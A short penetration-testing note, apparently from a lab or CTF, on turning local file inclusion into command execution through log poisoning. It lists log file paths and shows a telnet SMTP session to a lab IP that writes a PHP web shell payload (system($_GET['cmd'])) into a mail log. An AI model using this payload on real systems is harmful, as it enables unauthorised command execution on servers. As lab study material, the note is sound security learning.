LFI becomes RCI

We need to validate different logs files:

`/var/log/apache2/access.log` *apache's logs locaiton. We could look for useragent to manipulate it to be a malicous php code*

`/var/log/auth.log` *ssh's logs location*

## SMPT Log poisoning

`/var/mail/helios` *logs smtp stored. The idea is to create log that can be interpreted in php. For example if LFI is produced in a PHP web, creating logs this a PHP executable, by injecting it to site web, it could interpret commands.*

We can test by telnet:
$telnet 192.168.195.54 25
telnet>MAIL FROM: blinds
telnet>RCPT TO: helios *user found in server*
telnet>DATA
telnet><<?php system($_GET['cmd']); ?>
telnet>.
telnet>quit

![[Pasted image 20240322142902.png]]

We verify the logs and there is no content:






